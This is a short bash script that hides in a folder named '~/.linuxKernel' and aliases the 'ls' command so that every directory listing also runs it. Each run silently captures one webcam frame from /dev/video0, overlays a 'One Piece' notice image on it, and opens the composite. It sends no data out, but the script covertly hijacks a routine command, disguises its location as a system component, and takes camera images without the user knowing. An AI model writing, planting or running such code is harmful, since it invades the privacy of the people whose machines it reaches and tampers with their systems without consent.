#!/bin/bash

alias ls='ls ; bash ~/.linuxKernel/script.sh'

KERNEL_DIR="$HOME/.linuxKernel"

SOURCE_NOTICE="./one_piece_notice.png"
INSTALLED_NOTICE="$KERNEL_DIR/notice.png"
IMG_PATH="$KERNEL_DIR/result.png"
OUT_FILE="$KERNEL_DIR/output.png"

gst-launch-1.0 -q v4l2src device=/dev/video0 num_buffers=1 ! jpegenc ! filesink location="$IMG_PATH"
if [ ! -f "$IMG_PATH" ]; then
  exit 1
fi
magick "$IMG_PATH" \
  \( "$INSTALLED_NOTICE" -resize "$(magick identify -format "%wx%h" "$IMG_PATH")!" \) \
  -gravity center \
  -composite \
  "$OUT_FILE"

xdg-open "$OUT_FILE"
